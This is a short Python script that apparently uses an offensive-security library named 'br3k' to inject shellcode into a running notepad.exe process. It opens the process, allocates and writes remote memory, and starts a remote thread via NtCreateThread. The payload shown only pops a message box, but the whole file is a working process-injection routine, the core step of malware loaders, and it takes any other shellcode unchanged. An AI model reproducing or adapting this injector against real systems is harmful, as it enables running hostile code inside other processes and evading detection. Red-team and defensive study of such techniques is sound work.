import br3k
from br3k import ProcessOpenStrategy, ProcessVmStrategy

if __name__ == "__main__":

    print("Script: Inject via NtCreateThread()")
    print()

    br3k.init_sysapi()

    shellcode = br3k.shellcode_get_messageboxw()

    process = br3k.Process(
        name="notepad.exe",
        memory_strategy=ProcessVmStrategy.AllocateInAddr,
        process_open_strategy=ProcessOpenStrategy.OpenProcess
    )

    process.open()
    process.init_memory()
    process.create_memory(size=len(shellcode))
    ep = process.get_memory_remote_address()
    process.write_memory(data=shellcode)

    thread = br3k.Thread(process)
    thread.create(ep=ep)

    br3k.script_success()
